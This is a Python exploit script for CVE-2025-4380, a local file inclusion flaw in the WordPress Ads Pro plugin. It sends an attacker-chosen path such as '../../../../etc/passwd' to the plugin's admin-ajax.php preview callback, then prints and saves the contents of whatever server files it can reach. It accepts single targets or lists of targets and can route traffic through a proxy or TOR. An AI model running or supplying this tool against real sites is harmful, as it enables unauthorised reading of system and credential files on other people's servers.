#!/usr/bin/env python3
#By r0otk3r

import requests
import argparse
import sys
import os
from urllib.parse import urljoin
from urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BANNER = """
CVE-2025-4380 - Ads Pro Plugin <= 4.89 - Local File Inclusion (LFI)
Arbitrary File Reader Exploit.
"""

def setup_session(proxy=None):
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    return session

def save_to_file(filename, content):
    try:
        with open(filename, 'a') as f:
            f.write(content + "\n")
        print(f"[+] Output saved to: {filename}")
    except Exception as e:
        print(f"[!] Failed to save output: {e}")

def dump_file(session, target, file_path, output_file=None):
    endpoint = "/wp-admin/admin-ajax.php"
    url = urljoin(target, endpoint)
    data = {
        "action": "bsa_preview_callback",
        "bsa_template": file_path
    }

    print(f"\n[+] Exploiting {target} ...")
    print(f"[+] Endpoint: {endpoint}")

    try:
        response = session.post(url, data=data, verify=False, timeout=10)

        if response.status_code == 200:
            print(f"[+] {target} is VULNERABLE!")
            print(f"[+] Dumping file: {file_path}\n")
            content = response.text.strip()
            print(content)

            if "open_basedir restriction in effect" in content:
                print("[!] open_basedir restriction detected - LFI may be limited.")

            if output_file:
                save_to_file(output_file, f"\n=== {target} - {file_path} ===\n{content}")
            return True
        else:
            print(f"[-] {target} returned HTTP {response.status_code}. Possible WAF or protection.")
            return False

    except Exception as e:
        print(f"[ERROR] Could not connect to {target}: {e}")
        return False

def load_targets(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-4380 LFI Exploit")
    parser.add_argument("-u", "--url", help="Single target URL (e.g., http://target.com)", required=False)
    parser.add_argument("-l", "--list", help="File containing list of target URLs", required=False)
    parser.add_argument("-p", "--path", help="File to include (e.g., ../../../../etc/passwd)", required=True)
    parser.add_argument("--proxy", help="HTTP proxy or TOR (e.g., http://127.0.0.1:8080)", required=False)
    parser.add_argument("-o", "--output", help="Output file to save results", required=False)

    args = parser.parse_args()

    print(BANNER)

    if not args.url and not args.list:
        print("[!] You must specify either --url or --list")
        sys.exit(1)

    targets = []

    if args.url:
        targets.append(args.url)
    if args.list:
        targets.extend(load_targets(args.list))

    session = setup_session(proxy=args.proxy)

    for target in targets:
        dump_file(session, target, args.path, args.output)

if __name__ == "__main__":
    main()
